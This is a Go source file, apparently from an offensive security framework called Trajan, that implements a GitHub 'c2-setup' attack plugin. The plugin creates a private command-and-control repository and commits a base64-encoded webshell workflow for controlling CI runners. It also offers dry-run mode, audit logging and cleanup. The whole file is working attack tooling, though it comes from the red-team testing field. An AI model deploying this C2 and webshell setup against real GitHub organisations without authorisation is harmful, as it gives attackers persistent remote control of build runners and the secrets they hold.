package c2setup

import (
	"context"
	"fmt"
	"log/slog"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/github/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("github", "c2-setup", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements C2 repository setup attack
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new C2 setup attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"c2-setup",
			"Create C2 repository with webshell workflow for runner control",
			"github",
			attacks.CategoryC2,
		),
	}
}

// CanAttack checks if C2 setup is applicable
// Always returns true - C2 setup is a prerequisite for other attacks
// Permissions checked during execution
func (p *Plugin) CanAttack(_ []detections.Finding) bool {
	return true
}

// Execute performs the C2 setup attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Step 1: Generate random repository name
	repoName := fmt.Sprintf("trajan-c2-%s", common.GenerateRandomString(10))

	// Step 2: Get repo name override from ExtraOpts if provided
	if name, ok := opts.ExtraOpts["c2_repo_name"]; ok && name != "" {
		repoName = name
	}

	// Step 3: Handle dry-run mode (no platform needed)
	if opts.DryRun {
		// Extract owner from target repo for proper artifact format
		owner := "unknown-owner" // fallback
		if opts.Target.Value != "" {
			parts := strings.Split(opts.Target.Value, "/")
			if len(parts) >= 1 {
				owner = parts[0]
			}
		}

		// Construct full repo name in owner/repo format (matches real execution)
		fullRepoName := fmt.Sprintf("%s/%s", owner, repoName)

		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would create C2 repository: %s", fullRepoName)
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactRepository,
				Identifier:  fullRepoName,
				Description: "C2 repository",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  ".github/workflows/webshell.yml",
				Description: "Webshell workflow",
			},
		}
		return result, nil
	}

	// Step 4: Get GitHub client for actual execution
	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}
	client := ghPlatform.Client()

	// Step 4: Create C2 repository
	repo, err := createC2Repo(ctx, client, opts, github.CreateRepositoryInput{
		Name:        repoName,
		Description: "C2 repository for Trajan attack framework",
		Private:     true,
		AutoInit:    true,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create repository: %v", err)
		audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
		return result, err
	}

	slog.Debug("repository created",
		"owner", repo.Owner.Login,
		"name", repo.Name,
		"fullName", repo.FullName,
		"defaultBranch", repo.DefaultBranch)

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactRepository,
		Identifier:  repo.FullName,
		Description: "C2 repository created",
		URL:         repo.HTMLURL,
	})

	// Step 5: Wait for repository to be fully initialized
	// Poll GetRepository until DefaultBranch is populated (max 30 seconds)
	var defaultBranch string
	for i := 0; i < 10; i++ {
		time.Sleep(3 * time.Second)

		repo, err = client.GetRepository(ctx, repo.Owner.Login, repo.Name)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to fetch repository details (attempt %d): %v", i+1, err)
			audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
			return result, err
		}

		slog.Debug("get repository",
			"attempt", i+1,
			"owner", repo.Owner.Login,
			"name", repo.Name,
			"defaultBranch", repo.DefaultBranch)

		if repo.DefaultBranch != "" {
			defaultBranch = repo.DefaultBranch
			slog.Debug("default branch populated",
				"defaultBranch", defaultBranch)
			break
		}

		slog.Debug("default branch still empty, retrying",
			"attempt", i+1)
	}

	// If DefaultBranch is still empty after polling, default to "main"
	if defaultBranch == "" {
		defaultBranch = "main"
		slog.Debug("default branch still empty after 30s, defaulting",
			"defaultBranch", defaultBranch)
	}

	// Step 6: Deploy webshell workflow
	workflowPath := ".github/workflows/webshell.yml"
	workflowContent := common.WebshellWorkflowPayloadBase64()

	slog.Debug("creating workflow file",
		"owner", repo.Owner.Login,
		"repo", repo.Name,
		"branch", defaultBranch,
		"path", workflowPath)

	_, err = client.CreateOrUpdateFile(ctx, repo.Owner.Login, repo.Name,
		workflowPath, github.FileContentInput{
			Message: "Add webshell workflow",
			Content: workflowContent,
			Branch:  defaultBranch,
		})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create workflow (owner=%q, repo=%q, branch=%q, path=%q): %v",
			repo.Owner.Login, repo.Name, defaultBranch, workflowPath, err)
		audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
		return result, err
	}

	slog.Debug("workflow created successfully")

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  ".github/workflows/webshell.yml",
		Description: "Webshell workflow deployed",
	})

	result.Success = true
	result.Message = fmt.Sprintf("C2 repository created: %s", repo.FullName)
	result.Data = map[string]interface{}{
		"repo_full_name": repo.FullName,
		"repo_url":       repo.HTMLURL,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactRepository,
			Identifier:  repo.FullName,
			Action:      "delete",
			Description: "Delete C2 repository",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	ghPlatform, ok := session.Platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}
	client := ghPlatform.Client()

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			if action.Type == attacks.ArtifactRepository {
				parts := strings.Split(action.Identifier, "/")
				if len(parts) == 2 {
					if err := client.DeleteRepository(ctx, parts[0], parts[1]); err != nil {
						return fmt.Errorf("deleting repository %s: %w", action.Identifier, err)
					}
				}
			}
		}
	}

	return nil
}

// Dependencies implements ChainableAttackPlugin
func (p *Plugin) Dependencies() []string {
	return nil // No dependencies
}

// OptionalDependencies implements ChainableAttackPlugin
func (p *Plugin) OptionalDependencies() []string {
	return nil // No optional dependencies
}

// Provides implements ChainableAttackPlugin
func (p *Plugin) Provides() []attacks.ContextKey {
	return []attacks.ContextKey{
		attacks.C2RepoKey,
		attacks.C2URLKey,
	}
}

// Requires implements ChainableAttackPlugin
func (p *Plugin) Requires() []attacks.ContextKey {
	return nil // No requirements
}

// createC2Repo creates the C2 repository in the right namespace for the token type.
// User tokens => personal namespace (/user/repos). App installation tokens have no user
// namespace, so they require an explicit --c2-org and create via /orgs/{org}/repos.
func createC2Repo(ctx context.Context, client *github.Client, opts attacks.AttackOptions, input github.CreateRepositoryInput) (*github.Repository, error) {
	if client.IsGitHubAppToken() {
		org := opts.ExtraOpts["c2_org"]
		if org == "" {
			return nil, fmt.Errorf("installation token has no user namespace; pass --c2-org <org> (requires Administration:write and the app installed there) or use a user PAT")
		}
		return client.CreateOrgRepository(ctx, org, input)
	}
	return client.CreateRepository(ctx, input)
}
